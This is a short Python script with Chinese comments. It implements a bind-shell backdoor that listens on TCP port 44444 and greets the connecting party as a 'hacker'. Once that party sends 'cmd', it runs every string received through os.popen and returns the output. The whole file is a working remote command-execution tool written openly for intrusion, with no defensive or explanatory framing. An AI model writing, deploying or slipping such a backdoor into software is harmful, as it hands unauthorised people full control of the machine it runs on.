import socket
import os


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    print(host)
    port = 44444
    s.bind((host, port))  # 绑定本机ip和12345端口
    s.listen(7)  # 最多允许七个人连接我

    while True:
        c, addr = s.accept()
        print("连接地址是:", addr)
        c.send("欢迎黑客大佬".encode("utf-8"))
        while True:
            try:
                # 接收普通文字
                recv_data = c.recv(1024).decode("utf-8")
                print(recv_data)
                if recv_data == "cmd":  # 接收黑客发来的cmd命令\
                    c.send("ok ,cmd start".encode("utf-8"))
                    while True:
                        recv_data2 = c.recv(1024).decode("utf-8")
                        if recv_data2 == "exit":
                            c.send("now,the cmd stop".encode("utf-8"))
                            break
                        else:
                            # 若黑客没有发送退出命令，则执行黑客发送的命令，并读取命令执行的结果
                            x = os.popen(recv_data2).read()
                            # 把命令的回显发送给黑客
                            c.send(x.encode("utf-8"))
                else:
                    c.send(recv_data.encode("utf-8"))

            except Exception as e:
                print("断开连接")
                print(e)
                break
        c.close()
    s.close()

    pass


if __name__ == '__main__':
    main()
